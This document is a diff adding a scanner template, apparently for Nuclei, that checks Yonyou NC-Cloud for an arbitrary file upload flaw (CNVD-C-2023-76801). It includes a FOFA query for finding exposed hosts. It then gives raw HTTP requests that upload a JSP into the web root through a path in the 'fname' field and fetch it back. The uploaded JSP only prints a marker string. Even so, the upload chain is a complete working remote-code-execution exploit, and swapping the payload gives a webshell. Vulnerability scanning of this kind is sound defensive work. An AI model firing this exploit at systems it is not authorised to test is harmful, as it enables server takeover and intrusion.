@@ -1,0 +1,54 @@
+id: CNVD-C-2023-76801
+
+info:
+  name: NC-RCE-jsinvoke
+  author: hufei
+  severity: critical
+  description: |
+    Arbitrary file upload vulnerability in NC allows attackers to upload and execute malicious files, leading to potential unauthorized server control.
+  reference: CNVD-C-2023-76801
+  metadata:
+    max-request: 3
+    fofa-query: app="用友-NC-Cloud"
+  tags: NC-Cloud,rce,intrusive
+
+variables:
+  str1: '{{rand_base(6)}}'
+  str2: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /aim/equipmap/accept.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Connection: close
+        Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
+        Content-Length: 476
+
+        -----------------------------16314487820932200903769468567
+        Content-Disposition: form-data; name="upload"; filename="222222.txt"
+        Content-Type: text/plain
+
+        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));%>
+        -----------------------------16314487820932200903769468567
+        Content-Disposition: form-data; name="fname"
+
+        \webapps\nc_web\{{str1}}.jsp
+        -----------------------------16314487820932200903769468567--
+
+      - |
+        GET /{{str1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/3.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        part: body
